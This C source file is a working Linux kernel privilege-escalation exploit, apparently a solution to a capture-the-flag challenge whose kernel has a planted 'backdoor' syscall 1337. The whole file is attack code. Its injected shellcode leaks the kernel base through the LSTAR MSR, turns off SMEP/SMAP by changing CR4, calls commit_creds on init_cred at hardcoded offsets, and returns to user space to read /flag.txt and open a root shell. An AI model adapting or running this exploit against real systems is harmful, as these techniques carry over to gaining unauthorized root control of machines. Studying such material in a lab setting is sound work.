#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h> 
#include <string.h>
#include <stddef.h>
#include <stdint.h>
#include <unistd.h>
#include <sched.h>
#include <signal.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <fcntl.h>


#define BACKDOOR_SYSCALL 1337


#define COMMIT_CREDS_OFF 0x3298f0 
#define MODPROBE_PATH_OFF 0x1b48960
#define KALLSYM_LOOKUP_NAME_OFF 0x3d5390


#define LOG(format, ...) \
    printf("[*] [%s] %s - %d:", __FILE__, __func__, __LINE__); \
    printf(format, ##__VA_ARGS__); \
    printf("\n"); 


void finish(){

    LOG("gg easy");

    if (getuid() == 0){
        LOG("[*] UID: %d, got root!", getuid());
        system("cat /flag.txt");
        system("/bin/sh");
    }
    else {
        LOG("[!] UID %d, didn't get root", getuid());
        exit(-1);
    }


}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    LOG("[*] Saved state");
}

unsigned long user_rip = (unsigned long)finish;

const char *flag_path = "/flag.txt\x00";

void shellcode() __attribute__((naked));

void shellcode(){
    __asm__ volatile (
            ".intel_syntax noprefix;"
            "mov    ecx, 0xc0000082;"
            "rdmsr;"
            "shl    rdx, 32;"
            "or     rax, rdx;"   
            
            // Get syscall entry from msr
            "mov    rcx, rax;"
            "sub    rcx, 0xffffffff81000080;"

            "mov    rax, 0xffffffff81000000;"
            "add    rax, rcx;"

            // Resolve kernel text base
            "mov    r11, rax;"

            // Setup stack from extra space from executable shellcode
            "lea    rsi, [rip + 0x500];"
            "and    rsi, 0xfffffffffffffff0;"
            "mov    rsp, rsi;"

            // Disable smap/smep
            "mov    rbx, cr4;"
	        "xor    rbx, 0x300000;"
	        "mov    cr4, rbx;"
                

            // Call commit_creds(init_cred) 
            "mov    rdi, r11;"
            "add    rdi, 0x01a54c60;"
                
            "mov    r12, r11;"
            "add    r12, 0x003298f0;"

            "call   r12;" 


            "swapgs;"

            "mov r15, user_ss;"
            "push r15;"
            "mov r15, user_sp;"
            "push r15;"
            "mov r15, user_rflags;"
            "push r15;"
            "mov r15, user_cs;"
            "push r15;"
            "mov r15, user_rip;"
            "push r15;"

            "iretq;"

            ".att_syntax;"); 


 
}

int main(void){

    void *shellcode_buf = malloc(0xe00);

    memset(shellcode_buf, 0, 0xe00);
    memcpy(shellcode_buf, &shellcode, 0x120);
      
    save_state();

    signal(SIGSEGV, finish);

    LOG("Running shellcode");

    syscall(BACKDOOR_SYSCALL, &shellcode, 0xe00); 

    LOG("returned from shellcode");

}


